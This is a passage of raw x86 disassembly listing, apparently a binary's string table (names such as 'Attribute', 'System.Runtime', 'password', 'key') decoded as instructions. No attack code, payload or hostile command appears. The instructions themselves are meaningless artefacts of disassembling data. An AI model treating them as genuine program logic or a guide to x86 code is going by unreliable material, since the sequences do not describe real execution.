  406567:	outs   dx,BYTE PTR ds:[esi]
  406568:	add    BYTE PTR [ebp+0x69],cl
  40656b:	ins    DWORD PTR es:[edi],dx
  40656c:	gs push esp
  40656e:	jns    0x4065e0
  406570:	add    BYTE PTR gs:[ebx+0x74],dl
  406574:	jb     0x4065db
  406576:	popa   
  406577:	ins    DWORD PTR es:[edi],dx
  406578:	add    BYTE PTR [ebp+0x5f],ch
  40657b:	ins    BYTE PTR es:[edi],dx
  40657c:	outs   dx,DWORD PTR ds:[esi]
  40657d:	arpl   WORD PTR [ebx+0x0],bp
  406580:	ins    DWORD PTR es:[edi],dx
  406581:	pop    edi
  406582:	popa   
  406583:	jb     0x4065ea
  406585:	dec    edi
  406586:	jo     0x4065ed
  406588:	jb     0x4065eb
  40658a:	je     0x4065f5
  40658c:	outs   dx,DWORD PTR ds:[esi]
  40658d:	outs   dx,BYTE PTR ds:[esi]
  40658e:	jae    0x4065d3
  406590:	popa   
  406591:	outs   dx,BYTE PTR ds:[esi]
  406592:	arpl   WORD PTR [ebp+0x6c],sp
  406595:	ins    BYTE PTR es:[edi],dx
  406596:	gs add BYTE PTR fs:[eax+ebp*2+0x72],dl
  40659c:	gs popa 
  40659e:	add    BYTE PTR fs:[ebp+0x5f],ch
  4065a2:	ja     0x406613
  4065a4:	jb     0x406611
  4065a6:	gs jb  0x4065fd
  4065a9:	push   0x64616572
  4065ae:	add    BYTE PTR [ebp+0x78],al
  4065b1:	arpl   WORD PTR gs:[ebp+0x74],si
  4065b5:	gs inc ebx
  4065b7:	popa   
  4065b8:	outs   dx,BYTE PTR ds:[esi]
  4065b9:	arpl   WORD PTR [ebp+0x6c],sp
  4065bc:	inc    ecx
  4065bd:	ja     0x406620
  4065bf:	jb     0x406626
  4065c1:	dec    edi
  4065c2:	jo     0x406629
  4065c4:	jb     0x406627
  4065c6:	je     0x406631
  4065c8:	outs   dx,DWORD PTR ds:[esi]
  4065c9:	outs   dx,BYTE PTR ds:[esi]
  4065ca:	add    BYTE PTR [ebp+0x78],al
  4065cd:	arpl   WORD PTR gs:[ebp+0x74],si
  4065d1:	gs inc ebx
  4065d3:	popa   
  4065d4:	outs   dx,BYTE PTR ds:[esi]
  4065d5:	arpl   WORD PTR [ebp+0x6c],sp
  4065d8:	ins    BYTE PTR es:[edi],dx
  4065d9:	popa   
  4065da:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4f]
  4065de:	jo     0x406645
  4065e0:	jb     0x406643
  4065e2:	je     0x40664d
  4065e4:	outs   dx,DWORD PTR ds:[esi]
  4065e5:	outs   dx,BYTE PTR ds:[esi]
  4065e6:	add    BYTE PTR [ecx+0x72],ah
  4065e9:	addr16 jae 0x4065ec
  4065ec:	imul   ebp,DWORD PTR [esi+0x73],0x636e6174
  4065f3:	add    BYTE PTR gs:[ecx+0x6c],ah
  4065f7:	jo     0x406661
  4065f9:	popa   
  4065fa:	add    BYTE PTR [edi+0x70],ch
  4065fd:	je     0x406668
  4065ff:	outs   dx,DWORD PTR ds:[esi]
  406600:	outs   dx,BYTE PTR ds:[esi]
  406601:	push   esp
  406602:	jns    0x406674
  406604:	add    BYTE PTR gs:[edi+0x70],ch
  406608:	je     0x406673
  40660a:	outs   dx,DWORD PTR ds:[esi]
  40660b:	outs   dx,BYTE PTR ds:[esi]
  40660c:	push   esi
  40660d:	popa   
  40660e:	ins    BYTE PTR es:[edi],dx
  40660f:	jne    0x406676
  406611:	add    BYTE PTR [esi+0x61],dh
  406614:	ins    BYTE PTR es:[edi],dx
  406615:	jne    0x40667c
  406617:	add    BYTE PTR [ebx+0x6f],ah
  40661a:	outs   dx,BYTE PTR ds:[esi]
  40661b:	je     0x40667e
  40661d:	imul   ebp,DWORD PTR [esi+0x73],0x74706f00
  406624:	imul   ebp,DWORD PTR [edi+0x6e],0x79656b00
  40662b:	add    BYTE PTR [eax+0x61],dl
  40662e:	jb     0x406691
  406630:	ins    DWORD PTR es:[edi],dx
  406631:	inc    ecx
  406632:	jb     0x4066a6
  406634:	popa   
  406635:	jns    0x406678
  406637:	je     0x4066ad
  406639:	jb     0x4066a4
  40663b:	bound  esi,QWORD PTR [ebp+0x74]
  40663e:	add    BYTE PTR gs:[ebx+0x65],dh
  406642:	jb     0x4066ba
  406644:	imul   esp,DWORD PTR [ebx+0x65],0x74736f48
  40664b:	add    BYTE PTR [ebx+0x65],dh
  40664e:	jb     0x4066c6
  406650:	imul   esp,DWORD PTR [ebx+0x65],0x63736544
  406657:	jb     0x4066c2
  406659:	jo     0x4066cf
  40665b:	imul   ebp,DWORD PTR [edi+0x6e],0x72657300
  406662:	jbe    0x4066cd
  406664:	arpl   WORD PTR [ebp+0x48],sp
  406667:	outs   dx,DWORD PTR ds:[esi]
  406668:	jae    0x4066de
  40666a:	inc    edx
  40666b:	popa   
  40666c:	jae    0x4066d3
  40666e:	add    BYTE PTR [ebp+0x6e],ah
  406671:	fs jo  0x4066e3
  406674:	imul   ebp,DWORD PTR [esi+0x74],0x69620073
  40667b:	outs   dx,BYTE PTR ds:[esi]
  40667c:	imul   ebp,DWORD PTR fs:[esi+0x67],0x61726150
  406684:	ins    DWORD PTR es:[edi],dx
  406685:	gs je  0x4066ed
  406688:	jb     0x4066fd
  40668a:	add    BYTE PTR [edx+0x65],dh
  40668d:	jno    0x406704
  40668f:	gs jae 0x406706
  406692:	add    BYTE PTR [ebx+0x68],ah
  406695:	popa   
  406696:	outs   dx,BYTE PTR ds:[esi]
  406697:	outs   dx,BYTE PTR ds:[esi]
  406698:	gs ins BYTE PTR es:[edi],dx
  40669a:	add    BYTE PTR [ecx+0x6e],ch
  40669d:	jae    0x406713
  40669f:	popa   
  4066a0:	outs   dx,BYTE PTR ds:[esi]
  4066a1:	arpl   WORD PTR [ebp+0x43],sp
  4066a4:	outs   dx,DWORD PTR ds:[esi]
  4066a5:	outs   dx,BYTE PTR ds:[esi]
  4066a6:	je     0x40670d
  4066a8:	js     0x40671e
  4066aa:	add    BYTE PTR [edx+0x65],dh
  4066ad:	jo     0x40671b
  4066af:	jns    0x4066b1
  4066b1:	arpl   WORD PTR [edi+0x72],bp
  4066b4:	jb     0x40671b
  4066b6:	ins    BYTE PTR es:[edi],dx
  4066b7:	popa   
  4066b8:	je     0x406723
  4066ba:	outs   dx,DWORD PTR ds:[esi]
  4066bb:	outs   dx,BYTE PTR ds:[esi]
  4066bc:	push   ebx
  4066bd:	je     0x406720
  4066bf:	je     0x406726
  4066c1:	add    BYTE PTR [ecx+0x74],ch
  4066c4:	gs ins DWORD PTR es:[edi],dx
  4066c6:	push   eax
  4066c7:	popa   
  4066c8:	je     0x406732
  4066ca:	add    BYTE PTR [eax+0x61],dh
  4066cd:	jb     0x406730
  4066cf:	ins    DWORD PTR es:[edi],dx
  4066d0:	gs je  0x406738
  4066d3:	jb     0x40672b
  4066d5:	popa   
  4066d6:	ins    BYTE PTR es:[edi],dx
  4066d7:	jne    0x40673e
  4066d9:	jae    0x4066db
  4066db:	popa   
  4066dc:	ins    BYTE PTR es:[edi],dx
  4066dd:	ins    BYTE PTR es:[edi],dx
  4066de:	inc    ebx
  4066df:	jb     0x406746
  4066e1:	fs outs dx,BYTE PTR gs:[esi]
  4066e4:	je     0x40674f
  4066e6:	popa   
  4066e7:	ins    BYTE PTR es:[edi],dx
  4066e8:	jae    0x40673d
  4066ea:	popa   
  4066eb:	je     0x406756
  4066ed:	jae    0x406755
  4066ef:	imul   esp,DWORD PTR [ebp+0x64],0x73795300
  4066f6:	je     0x40675d
  4066f8:	ins    DWORD PTR es:[edi],dx
  4066f9:	cs push edx
  4066fb:	jne    0x40676b
  4066fd:	je     0x406768
  4066ff:	ins    DWORD PTR es:[edi],dx
  406700:	gs cs dec ecx
  406703:	outs   dx,BYTE PTR ds:[esi]
  406704:	je     0x40676b
  406706:	jb     0x406777
  406708:	jo     0x40675d
  40670a:	gs jb  0x406783
  40670d:	imul   esp,DWORD PTR [ebx+0x65],0x754f0073
  406714:	je     0x406757
  406716:	je     0x40678c
  406718:	jb     0x406783
  40671a:	bound  esi,QWORD PTR [ebp+0x74]
  40671d:	add    BYTE PTR gs:[ebx+0x72],ah
  406721:	gs fs outs dx,BYTE PTR gs:[esi]
  406725:	je     0x406790
  406727:	popa   
  406728:	ins    BYTE PTR es:[edi],dx
  406729:	jae    0x40672b
  40672b:	outs   dx,WORD PTR ds:[esi]
  40672d:	jb     0x40679c
  40672f:	popa   
  406730:	je     0x406732
  406732:	fs gs jbe 0x40679f
  406736:	arpl   WORD PTR [ebp+0x49],sp
  406739:	outs   dx,BYTE PTR ds:[esi]
  40673a:	outs   dx,WORD PTR ds:[esi]
  40673c:	add    BYTE PTR [eax+0x61],dh
  40673f:	imul   ebp,DWORD PTR [bp+0x61],0x6e6f6974
  406747:	dec    ebp
  406748:	outs   dx,DWORD PTR ds:[esi]
  406749:	fs add BYTE PTR gs:[ebx+0x74],dh
  40674e:	jb     0x4067b5
  406750:	popa   
  406751:	ins    DWORD PTR es:[edi],dx
  406752:	dec    ecx
  406753:	add    BYTE PTR fs:[ebp+0x69],ch
  406757:	ins    DWORD PTR es:[edi],dx
  406758:	gs push esp
  40675a:	jns    0x4067cc
  40675c:	add    BYTE PTR gs:[edi+ebp*2+0x67],dh
  406761:	ins    BYTE PTR es:[di],dx
  406763:	gs dec ecx
  406765:	add    BYTE PTR fs:[edx+0x6f],ah
  406769:	outs   dx,DWORD PTR ds:[esi]
  40676a:	imul   ebp,DWORD PTR [ebp+0x61],0x72
  40676e:	imul   ecx,DWORD PTR [ecx+0x64],0x0
  406772:	jne    0x4067e2
  406774:	imul   esi,DWORD PTR [ecx+0x75],0x6d614e65
  40677b:	add    BYTE PTR gs:[edi+ebp*2+0x63],ah
  406780:	jne    0x4067ef
  406782:	outs   dx,BYTE PTR gs:[esi]
  406784:	je     0x4067d3
  406786:	popa   
  406787:	jo     0x4067d2
  406789:	add    BYTE PTR fs:[ebx+0x6f],dh
  40678d:	jb     0x406803
  40678f:	dec    ecx
  406790:	add    BYTE PTR fs:[ebx+0x6f],dh
  406794:	jb     0x40680a
  406796:	dec    edi
  406797:	jo     0x40680d
  406799:	imul   ebp,DWORD PTR [edi+0x6e],0x6c630073
  4067a0:	gs popa 
  4067a2:	jb     0x4067f7
  4067a4:	outs   dx,DWORD PTR ds:[esi]
  4067a5:	jb     0x40681b
  4067a7:	add    BYTE PTR [ebx+0x74],dh
  4067aa:	popa   
  4067ab:	jb     0x406821
  4067ad:	push   eax
  4067ae:	popa   
  4067af:	add    BYTE PTR gs:[di+0x6e],ah
  4067b4:	fs push eax
  4067b6:	popa   
  4067b7:	add    BYTE PTR gs:[bp+di+0x65],dh
  4067bc:	popa   
  4067bd:	jb     0x406822
  4067bf:	push   0x74786554
  4067c4:	add    BYTE PTR [edx+esi*2+0x69],ah
  4067c8:	ins    BYTE PTR es:[edi],dx
  4067c9:	ins    BYTE PTR es:[edi],dx
  4067ca:	je     0x406834
  4067cc:	jb     0x40683d
  4067ce:	jne    0x406837
  4067d0:	push   0x70006449
  4067d5:	popa   
  4067d6:	jb     0x406839
  4067d8:	ins    DWORD PTR es:[edi],dx
  4067d9:	gs je  0x406841
  4067dc:	jb     0x406851
  4067de:	inc    esi
  4067df:	outs   dx,DWORD PTR ds:[esi]
  4067e0:	jb     0x406826
  4067e2:	jb     0x40684d
  4067e4:	ins    BYTE PTR es:[edi],dx
  4067e5:	ins    BYTE PTR es:[edi],dx
  4067e6:	je     0x406850
  4067e8:	jb     0x406859
  4067ea:	jne    0x406853
  4067ec:	push   0x6f706552
  4067f1:	jb     0x406867
  4067f3:	add    BYTE PTR [ebx+0x68],dh
  4067f6:	outs   dx,DWORD PTR ds:[esi]
  4067f7:	jne    0x406865
  4067f9:	fs inc ebx
  4067fb:	popa   
  4067fc:	outs   dx,BYTE PTR ds:[esi]
  4067fd:	arpl   WORD PTR [ebp+0x6c],sp
  406800:	push   edx
  406801:	gs jno 0x406879
  406804:	gs jae 0x40687b
  406807:	jae    0x406809
  406809:	jb     0x406870
  40680b:	jae    0x40687c
  40680d:	jne    0x406881
  40680f:	arpl   WORD PTR [ebp+0x50],sp
  406812:	popa   
  406813:	je     0x40687d
  406815:	add    BYTE PTR [ecx+eiz*2+0x74],ah
  406819:	popa   
  40681a:	push   ebx
  40681b:	outs   dx,DWORD PTR ds:[esi]
  40681c:	jne    0x406890
  40681e:	arpl   WORD PTR [ebp+0x50],sp
  406821:	popa   
  406822:	je     0x40688c
  406824:	add    BYTE PTR [ecx+eiz*2+0x74],ah
  406828:	popa   
  406829:	push   ebx
  40682a:	gs je  0x40687d
  40682d:	popa   
  40682e:	je     0x406898
  406830:	add    BYTE PTR [ecx+eiz*2+0x74],ah
  406834:	popa   
  406835:	push   ebx
  406836:	outs   dx,DWORD PTR ds:[esi]
  406837:	jne    0x4068ab
  406839:	arpl   WORD PTR [ebp+0x4e],sp
  40683c:	popa   
  40683d:	ins    DWORD PTR es:[edi],dx
  40683e:	add    BYTE PTR gs:[ebp+0x73],dh
  406842:	gs jb  0x406893
  406845:	popa   
  406846:	ins    DWORD PTR es:[edi],dx
  406847:	add    BYTE PTR gs:[eax+0x61],dh
  40684b:	jae    0x4068c0
  40684d:	ja     0x4068be
  40684f:	jb     0x4068b5
  406851:	add    BYTE PTR [ecx+0x73],ch
  406854:	dec    edi
  406855:	jne    0x4068cb
  406857:	dec    edi
  406858:	inc    sp
  40685a:	popa   
  40685b:	je     0x4068c2
  40685d:	add    BYTE PTR [ebx+0x74],dh
  406860:	jb     0x4068c7
  406862:	popa   
  406863:	ins    DWORD PTR es:[edi],dx
  406864:	dec    esi
  406865:	popa   
  406866:	ins    DWORD PTR es:[edi],dx
  406867:	add    BYTE PTR gs:[esi+0x69],ah
  40686b:	ins    BYTE PTR es:[edi],dx
  40686c:	gs inc ebp
  40686e:	js     0x4068e4
  406870:	outs   dx,BYTE PTR gs:[esi]
  406872:	jae    0x4068dd
  406874:	outs   dx,DWORD PTR ds:[esi]
  406875:	outs   dx,BYTE PTR ds:[esi]
  406876:	add    BYTE PTR [ebp+0x6e],ah
  406879:	arpl   WORD PTR [edi+0x64],bp
  40687c:	imul   ebp,DWORD PTR [esi+0x67],0x72747300
  406883:	gs popa 
  406885:	ins    DWORD PTR es:[edi],dx
  406886:	inc    ebx
  406887:	outs   dx,DWORD PTR ds:[esi]
  406888:	outs   dx,BYTE PTR ds:[esi]
  406889:	je     0x4068f0
  40688b:	outs   dx,BYTE PTR ds:[esi]
  40688c:	je     0x406901
  40688e:	add    BYTE PTR [ebx+0x65],dh
  406891:	jb     0x406909
  406893:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6143
  40689a:	bound  esp,QWORD PTR [ecx+0x63]
  40689d:	imul   eax,DWORD PTR [eax],0x63
  4068a0:	popa   
  4068a1:	outs   dx,BYTE PTR ds:[esi]
  4068a2:	arpl   WORD PTR [ebp+0x6c],sp
  4068a5:	push   ebx
  4068a6:	je     0x406909
  4068a8:	je     0x40690f
  4068aa:	add    BYTE PTR [ecx+0x74],ch
  4068ad:	gs ins DWORD PTR es:[edi],dx
  4068af:	inc    ebx
  4068b0:	outs   dx,DWORD PTR ds:[esi]
  4068b1:	outs   dx,BYTE PTR ds:[esi]
  4068b2:	je     0x406919
  4068b4:	js     0x40692a
  4068b6:	add    BYTE PTR [edx+0x65],dh
  4068b9:	jo     0x40692a
  4068bb:	jb     0x406931
  4068bd:	dec    esi
  4068be:	popa   
  4068bf:	ins    DWORD PTR es:[edi],dx
  4068c0:	add    BYTE PTR gs:[edx+0x65],dh
  4068c4:	jo     0x406935
  4068c6:	jb     0x40693c
  4068c8:	inc    edx
  4068c9:	jns    0x40693f
  4068cb:	gs jae 0x4068ce
  4068ce:	popa   
  4068cf:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  4068d3:	outs   dx,BYTE PTR ds:[esi]
  4068d4:	add    BYTE PTR [ebx+0x74],dh
  4068d7:	jb     0x40693e
  4068d9:	popa   
  4068da:	ins    DWORD PTR es:[edi],dx
  4068db:	dec    ecx
  4068dc:	outs   dx,BYTE PTR ds:[esi]
  4068dd:	outs   dx,WORD PTR ds:[esi]
  4068df:	add    BYTE PTR [esi+0x61],ch
  4068e2:	ins    DWORD PTR es:[edi],dx
  4068e3:	add    BYTE PTR gs:[ebx+0x74],dh
  4068e7:	jb     0x40694e
  4068e9:	popa   
  4068ea:	ins    DWORD PTR es:[edi],dx
  4068eb:	add    BYTE PTR [ebx+0x68],dh
  4068ee:	outs   dx,DWORD PTR ds:[esi]
  4068ef:	jne    0x40695d
  4068f1:	fs inc ebx
  4068f3:	popa   
  4068f4:	outs   dx,BYTE PTR ds:[esi]
  4068f5:	arpl   WORD PTR [ebp+0x6c],sp
  4068f8:	dec    edi
  4068f9:	jo     0x406960
  4068fb:	jb     0x40695e
  4068fd:	je     0x406968
  4068ff:	outs   dx,DWORD PTR ds:[esi]
  406900:	outs   dx,BYTE PTR ds:[esi]
  406901:	jae    0x406903
  406903:	outs   dx,DWORD PTR ds:[esi]
  406904:	jo     0x40696b
  406906:	jb     0x406969
  406908:	je     0x406973
  40690a:	outs   dx,DWORD PTR ds:[esi]
  40690b:	outs   dx,BYTE PTR ds:[esi]
  40690c:	add    BYTE PTR [eax+ebp*2+0x72],dh
  406910:	outs   dx,DWORD PTR ds:[esi]
  406911:	ja     0x406962
  406913:	outs   dx,BYTE PTR ds:[esi]
  406914:	inc    ebx
  406915:	popa   
  406916:	outs   dx,BYTE PTR ds:[esi]
  406917:	arpl   WORD PTR [ebp+0x6c],sp
  40691a:	ins    BYTE PTR es:[edi],dx
  40691b:	gs add BYTE PTR fs:[ebx+0x6f],al
  406920:	ins    DWORD PTR es:[edi],dx
  406921:	push   esi
  406922:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  406929:	je     0x40699f
  40692b:	jb     0x406996
  40692d:	bound  esi,QWORD PTR [ebp+0x74]
  406930:	add    BYTE PTR gs:[ebx+0x79],dl
  406934:	jae    0x4069aa
  406936:	gs ins DWORD PTR es:[edi],dx
  406938:	cs push edx
  40693a:	gs data16 ins BYTE PTR es:[edi],dx
  40693d:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  406942:	outs   dx,BYTE PTR ds:[esi]
  406943:	add    BYTE PTR [ecx+0x73],al
  406946:	jae    0x4069ad
  406948:	ins    DWORD PTR es:[edi],dx
  406949:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  40694d:	gs jb  0x4069c3
  406950:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  406957:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40695e:	jae    0x4069d3
  406960:	gs ins DWORD PTR es:[edi],dx
  406962:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  406966:	jb     0x4069d7
  406968:	fs jne 0x4069ce
  40696b:	je     0x4069ae
  40696d:	je     0x4069e3
  40696f:	jb     0x4069da
  406971:	bound  esi,QWORD PTR [ebp+0x74]
  406974:	add    BYTE PTR gs:[ecx+0x73],al
  406978:	jae    0x4069df
  40697a:	ins    DWORD PTR es:[edi],dx
  40697b:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40697f:	outs   dx,DWORD PTR ds:[esi]
  406980:	jo     0x4069fb
  406982:	jb     0x4069ed
  406984:	addr16 push 0x74744174
  40698a:	jb     0x4069f5
  40698c:	bound  esi,QWORD PTR [ebp+0x74]
  40698f:	add    BYTE PTR gs:[ecx+0x73],al
  406993:	jae    0x4069fa
  406995:	ins    DWORD PTR es:[edi],dx
  406996:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40699a:	outs   dx,DWORD PTR ds:[esi]
  40699b:	ins    DWORD PTR es:[edi],dx
  40699c:	jo     0x4069ff
  40699e:	outs   dx,BYTE PTR ds:[esi]
  40699f:	jns    0x4069e2
  4069a1:	je     0x406a17
  4069a3:	jb     0x406a0e
  4069a5:	bound  esi,QWORD PTR [ebp+0x74]
  4069a8:	add    BYTE PTR gs:[ecx+0x73],al
  4069ac:	jae    0x406a13
  4069ae:	ins    DWORD PTR es:[edi],dx
  4069af:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  4069b3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  4069bb:	outs   dx,DWORD PTR ds:[esi]
  4069bc:	outs   dx,BYTE PTR ds:[esi]
  4069bd:	inc    ecx
  4069be:	je     0x406a34
  4069c0:	jb     0x406a2b
  4069c2:	bound  esi,QWORD PTR [ebp+0x74]
  4069c5:	add    BYTE PTR gs:[ecx+0x73],al
  4069c9:	jae    0x406a30
  4069cb:	ins    DWORD PTR es:[edi],dx
  4069cc:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4069d0:	outs   dx,BYTE PTR ds:[esi]
  4069d1:	outs   dx,WORD PTR ds:[esi]
  4069d3:	jb     0x406a42
  4069d5:	popa   
  4069d6:	je     0x406a41
  4069d8:	outs   dx,DWORD PTR ds:[esi]
  4069d9:	outs   dx,BYTE PTR ds:[esi]
  4069da:	popa   
  4069db:	ins    BYTE PTR es:[edi],dx
  4069dc:	push   esi
  4069dd:	gs jb  0x406a53
  4069e0:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4069e7:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4069ee:	jae    0x406a63
  4069f0:	gs ins DWORD PTR es:[edi],dx
  4069f2:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  4069f6:	gs jns 0x406a3f
  4069f9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  406a01:	bound  esi,QWORD PTR [ebp+0x74]
  406a04:	add    BYTE PTR gs:[ecx+0x73],al
  406a08:	jae    0x406a6f
  406a0a:	ins    DWORD PTR es:[edi],dx
  406a0b:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  406a0f:	gs ins BYTE PTR es:[edi],dx
  406a11:	popa   
  406a12:	jns    0x406a67
  406a14:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  406a1b:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  406a22:	jae    0x406a97
  406a24:	gs ins DWORD PTR es:[edi],dx
  406a26:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  406a2a:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  406a32:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  406a39:	jae    0x406aae
  406a3b:	gs ins DWORD PTR es:[edi],dx
  406a3d:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  406a41:	gs jae 0x406aa7
  406a44:	jb     0x406aaf
  406a46:	jo     0x406abc
  406a48:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  406a4f:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  406a56:	jae    0x406acb
  406a58:	gs ins DWORD PTR es:[edi],dx
  406a5a:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  406a5e:	jb     0x406ac1
  406a60:	fs gs ins DWORD PTR es:[edi],dx
  406a63:	popa   
  406a64:	jb     0x406ad1
  406a66:	inc    ecx
  406a67:	je     0x406add
  406a69:	jb     0x406ad4
  406a6b:	bound  esi,QWORD PTR [ebp+0x74]
  406a6e:	add    BYTE PTR gs:[ebx+0x79],dl
  406a72:	jae    0x406ae8
  406a74:	gs ins DWORD PTR es:[edi],dx
  406a76:	cs inc esp
  406a78:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  406a7f:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  406a86:	jne    0x406aef
  406a88:	addr16 popa 
  406a8a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  406a8e:	je     0x406b04
  406a90:	jb     0x406afb
  406a92:	bound  esi,QWORD PTR [ebp+0x74]
  406a95:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  406a9a:	jne    0x406b03
  406a9c:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  406aa4:	jae    0x406aa6
  406aa6:	push   ebx
  406aa7:	jns    0x406b1c
  406aa9:	je     0x406b10
  406aab:	ins    DWORD PTR es:[edi],dx
  406aac:	cs push edx
  406aae:	jne    0x406b1e
  406ab0:	je     0x406b1b
  406ab2:	ins    DWORD PTR es:[edi],dx
  406ab3:	gs cs inc ebx
  406ab6:	outs   dx,DWORD PTR ds:[esi]
  406ab7:	ins    DWORD PTR es:[edi],dx
  406ab8:	jo     0x406b23
  406aba:	ins    BYTE PTR es:[edi],dx
  406abb:	gs jb  0x406b11
  406abe:	gs jb  0x406b37
  406ac1:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  406ac8:	ins    DWORD PTR es:[edi],dx
  406ac9:	jo     0x406b34
  406acb:	ins    BYTE PTR es:[edi],dx
  406acc:	popa   
  406acd:	je     0x406b38
  406acf:	outs   dx,DWORD PTR ds:[esi]
  406ad0:	outs   dx,BYTE PTR ds:[esi]
  406ad1:	push   edx
  406ad2:	gs ins BYTE PTR es:[edi],dx
  406ad4:	popa   
  406ad5:	js     0x406b38
  406ad7:	je     0x406b42
  406ad9:	outs   dx,DWORD PTR ds:[esi]
  406ada:	outs   dx,BYTE PTR ds:[esi]
  406adb:	jae    0x406b1e
  406add:	je     0x406b53
  406adf:	jb     0x406b4a
  406ae1:	bound  esi,QWORD PTR [ebp+0x74]
  406ae4:	add    BYTE PTR gs:[edx+0x75],dl
  406ae8:	outs   dx,BYTE PTR ds:[esi]
  406ae9:	je     0x406b54
  406aeb:	ins    DWORD PTR es:[edi],dx
  406aec:	gs inc ebx
  406aee:	outs   dx,DWORD PTR ds:[esi]
  406aef:	ins    DWORD PTR es:[edi],dx
  406af0:	jo     0x406b53
  406af2:	je     0x406b5d
  406af4:	bound  ebp,QWORD PTR [ecx+0x6c]
  406af7:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  406aff:	bound  esi,QWORD PTR [ebp+0x74]
  406b02:	add    BYTE PTR gs:[ebx+0x6f],al
  406b06:	outs   dx,BYTE PTR ds:[esi]
  406b07:	jae    0x406b78
  406b09:	ins    BYTE PTR es:[edi],dx
  406b0a:	add    BYTE PTR gs:[edi+0x72],dl
  406b0e:	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x656e69
  406b16:	push   esp
  406b17:	gs js  0x406b8e
  406b1a:	push   edi
  406b1b:	jb     0x406b86
  406b1d:	je     0x406b84
  406b1f:	jb     0x406b21
  406b21:	addr16 gs je 0x406b84
  406b25:	inc    ebp
  406b26:	jb     0x406b9a
  406b28:	outs   dx,DWORD PTR ds:[esi]
  406b29:	jb     0x406b2b
  406b2b:	push   esp
  406b2c:	outs   dx,DWORD PTR ds:[esi]
  406b2d:	push   ebx
  406b2e:	je     0x406ba2
  406b30:	imul   ebp,DWORD PTR [esi+0x67],0x63784500
  406b37:	gs jo  0x406bae
  406b3a:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  406b41:	pop    edi
  406b42:	dec    ebp
  406b43:	gs jae 0x406bb9
  406b46:	popa   
  406b47:	add    BYTE PTR gs:[bp+si+0x6f],al
  406b4c:	outs   dx,DWORD PTR ds:[esi]
  406b4d:	ins    BYTE PTR es:[edi],dx
  406b4e:	gs popa 
  406b50:	outs   dx,BYTE PTR ds:[esi]
  406b51:	add    BYTE PTR [ebx+0x74],dl
  406b54:	jb     0x406bbf
  406b56:	outs   dx,BYTE PTR ds:[esi]
  406b57:	add    BYTE PTR [bx+0x65],ah
  406b5b:	je     0x406bbc
  406b5d:	inc    ebx
  406b5e:	push   0x737261
  406b63:	addr16 gs je 0x406bc6
  406b67:	dec    esp
  406b68:	outs   dx,BYTE PTR gs:[esi]
  406b6a:	addr16 je 0x406bd5
  406b6d:	add    BYTE PTR [ebx+0x68],al
  406b70:	popa   
  406b71:	jb     0x406b73
  406b73:	dec    ecx
  406b74:	jae    0x406bc2
  406b76:	gs je  0x406bed
  406b79:	gs jb  0x406b7c
  406b7c:	push   ebx
  406b7d:	jne    0x406be1
  406b7f:	jae    0x406bf5
  406b81:	jb     0x406bec
  406b83:	outs   dx,BYTE PTR ds:[esi]
  406b84:	add    BYTE PTR [bp+di+0x6f],al
  406b88:	outs   dx,BYTE PTR ds:[esi]
  406b89:	arpl   WORD PTR [ecx+0x74],sp
  406b8c:	add    BYTE PTR [edi+0x65],ah
  406b8f:	je     0x406bf0
  406b91:	dec    ecx
  406b92:	outs   dx,BYTE PTR ds:[esi]
  406b93:	jbe    0x406bf6
  406b95:	jb     0x406c00
  406b97:	popa   
  406b98:	outs   dx,BYTE PTR ds:[esi]
  406b99:	je     0x406bde
  406b9b:	jne    0x406c09
  406b9d:	je     0x406c14
  406b9f:	jb     0x406c06
  406ba1:	add    BYTE PTR [edi+ebp*2+0x55],dl
  406ba5:	jo     0x406c17
  406ba7:	gs jb  0x406baa
  406baa:	inc    ecx
  406bab:	jb     0x406c1f
  406bad:	popa   
  406bae:	jns    0x406bb0
  406bb0:	inc    edi
  406bb1:	gs je  0x406c00
  406bb4:	outs   dx,BYTE PTR gs:[esi]
  406bb6:	addr16 je 0x406c21
  406bb9:	add    BYTE PTR [esi+0x6c],al
  406bbc:	popa   
  406bbd:	addr16 jae 0x406c01
  406bc0:	je     0x406c36
  406bc2:	jb     0x406c2d
  406bc4:	bound  esi,QWORD PTR [ebp+0x74]
  406bc7:	add    BYTE PTR gs:[edi+0x65],ah
  406bcb:	je     0x406c2c
  406bcd:	inc    ebx
  406bce:	jne    0x406c42
  406bd0:	jb     0x406c37
  406bd2:	outs   dx,BYTE PTR ds:[esi]
  406bd3:	je     0x406c18
  406bd5:	jne    0x406c43
  406bd7:	je     0x406c4e
  406bd9:	jb     0x406c40
